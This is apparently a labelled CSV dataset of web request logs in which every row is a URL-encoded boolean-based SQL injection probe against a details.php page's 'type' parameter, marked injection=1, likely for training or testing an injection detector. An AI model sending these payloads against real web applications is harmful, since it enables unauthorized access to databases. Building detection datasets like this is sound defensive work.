full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F%27%29%20AND%202383%3D8695--%20fEnt,1681395120.735791,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104--%20QLaa,1681395120.792663,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%209764%3D1701--%20zKmQ,1681395120.797465,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%205104%3D5104--%20gxKU,1681395120.802544,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%205333%3D2454--%20PSuP,1681395120.865,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20AND%205104%3D5104--%20DNhI,1681395120.870335,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%202096%3D6452%20AND%20%284056%3D4056,1681395120.87643,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104%20AND%20%286402%3D6402,1681395120.938336,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AND%201535%3D6860%20AND%20%28%288677%3D8677,1681395120.997679,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AND%205104%3D5104%20AND%20%28%289761%3D9761,1681395121.002116,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205675%3D6106%20AND%20%28%28%283678%3D3678,1681395121.006055,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20AND%205104%3D5104%20AND%20%28%28%284939%3D4939,1681395121.009066,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%204929%3D5154,1681395121.013405,192.168.43.6,1
/details.php?prod=5&type=%3F%20AND%205104%3D5104,1681395121.061311,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%207884%3D2455%20AND%20%28%27BLVX%27%3D%27BLVX,1681395121.065082,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AND%205104%3D5104%20AND%20%28%27KcWD%27%3D%27KcWD,1681395121.069974,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205401%3D5219%20AND%20%28%28%27JfIK%27%3D%27JfIK,1681395121.075137,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AND%205104%3D5104%20AND%20%28%28%27upML%27%3D%27upML,1681395121.078728,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205429%3D3904%20AND%20%28%28%28%27slbH%27%3D%27slbH,1681395121.082896,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20AND%205104%3D5104%20AND%20%28%28%28%27CWZH%27%3D%27CWZH,1681395121.088536,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20AND%201405%3D6623%20AND%20%27uLNg%27%3D%27uLNg,1681395121.092646,192.168.43.6,1
